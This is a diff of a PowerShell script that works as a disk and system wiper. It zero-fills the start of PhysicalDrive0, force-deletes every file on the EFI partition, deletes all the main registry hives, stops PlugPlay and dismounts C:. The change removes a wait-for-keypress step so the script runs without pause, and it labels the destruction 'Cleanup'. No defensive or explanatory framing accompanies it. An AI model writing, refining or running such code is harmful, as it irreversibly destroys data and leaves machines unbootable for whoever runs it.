@@ -1,9 +1,8 @@
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 $disk = "\\.\PhysicalDrive0"
 $size = 1640960000
 $bytes = New-Object byte[]($size)
 try {
-    $stream = New-Object System.IO.FileStream($disk, 'Open', 'ReadWrite')
+    $stream = [System.IO.File]::Open($disk, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
     $stream.Position = 0
     $stream.Write($bytes, 0, $size)
 } catch {
@@ -11,13 +10,18 @@ try {
 } finally {
     if ($stream) { $stream.Close() }
 }
-cmd /c "mountvol S: /s"
-if ($LASTEXITCODE -ne 0) { Write-Host "Mountvol error: $LASTEXITCODE" }
+
+# Mount EFI partition
+if (!(mountvol S: /s)) {
+    Write-Host "Mountvol error"
+    exit
+}
+
+# Cleanup
 cmd /c "del /f /s /q S:*.* > NUL 2>&1"
-cmd /c "reg delete HKLM /f"
-cmd /c "reg delete HKCC /f"
-cmd /c "reg delete HKU /f"
-cmd /c "reg delete HKCR /f"
-cmd /c "reg delete HKCU /f"
+@("HKLM", "HKCC", "HKU", "HKCR", "HKCU") | ForEach-Object {
+    cmd /c "reg delete $_ /f"
+}
+
 Stop-Service -Name PlugPlay -Force -ErrorAction SilentlyContinue
-cmd /c "mountvol C: /d"
+mountvol C: /d
